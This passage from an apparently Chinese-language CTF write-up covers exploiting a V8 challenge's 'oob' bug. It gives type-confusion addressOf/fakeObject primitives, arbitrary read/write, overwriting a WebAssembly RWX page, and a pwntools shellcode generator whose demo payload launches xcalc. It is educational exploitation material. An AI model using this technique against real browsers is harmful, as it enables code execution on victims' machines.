punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，执行了 WASM 输出了 main 函数的返回值 42<br><img src="/images/3b546c3b/pasted-29.png" alt="pwn2_2"></p>
<p>但是 WASM 肯定是不能想执行什么就执行什么的，浏览器是不允许 WASM 直接调用系统函数的，只能做一些数学计算等，但是 WASM 管理了一块 RWX 属性的内存段，每当调用 WASM 的函数，都会从这里开始执行指令，如果将这里改写为构造好的 shellcode，那么就可以达成执行任意 shellcode 的目的了</p>
<p>这里调试跟踪一下这块 RWX 内存的位置，首先查看 main 函数对象，找到 shared_info<br><img src="/images/3b546c3b/pasted-30.png" alt="pwn2_3"></p>
<p>再通过 shared_info 找到 data<br><img src="/images/3b546c3b/pasted-31.png" alt="pwn2_4"></p>
<p>再通过 data 找到 instance<br><img src="/images/3b546c3b/pasted-32.png" alt="pwn2_5"></p>
<p>在 instance 的固定偏移处可以找到这个 RWX 段的地址，这个固定偏移因编译参数环境等而异，本道题目则是 <code>+0x88</code><br><img src="/images/3b546c3b/pasted-33.png" alt="pwn2_6"></p>
<p>最后代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span> 
<span class="token comment">//shellcode</span>
<span class="token punctuation">]</span>


<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//%SystemBreak();</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pwn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就差 shellcode 了，这里写了一个脚本用来生成 shellcode，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">just8</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    real_size <span class="token operator">=</span> size <span class="token keyword">if</span> size <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> size <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> size <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>real_size<span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_js</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">'var sc_arr = ['</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">'\n'</span>
        x <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        
        ret <span class="token operator">+=</span> <span class="token string">'\t'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'n,'</span>

    ret <span class="token operator">+=</span> <span class="token string">'\n]\n'</span>

    <span class="token keyword">return</span> ret


<span class="token keyword">def</span> <span class="token function">call_exec</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sc <span class="token operator">=</span> <span class="token string">''</span>
    
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'rdi'</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">)</span>
    
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr_array<span class="token punctuation">(</span><span class="token string">'rsi'</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr_array<span class="token punctuation">(</span><span class="token string">'rdx'</span><span class="token punctuation">,</span> envp<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>syscall<span class="token punctuation">(</span><span class="token string">'SYS_execve'</span><span class="token punctuation">)</span>
 
    <span class="token keyword">return</span> sc

context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>


sc <span class="token operator">=</span> <span class="token string">''</span>
sc <span class="token operator">=</span> call_exec<span class="token punctuation">(</span><span class="token string">'/usr/bin/xcalc'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'xcalc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'DISPLAY=:0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span>

data <span class="token operator">=</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>
data <span class="token operator">=</span> just8<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>to_js<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要注意的是，很多初学者都会遇到一个问题，execve 没法弹计算器，这是因为执行图形程序需要一个环境变量 DISPLAY，用来指定图形输出的设备，一般情况下写 <code>DISPLAY=:0</code> 即可</p>
<p>最终完整 exp 如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
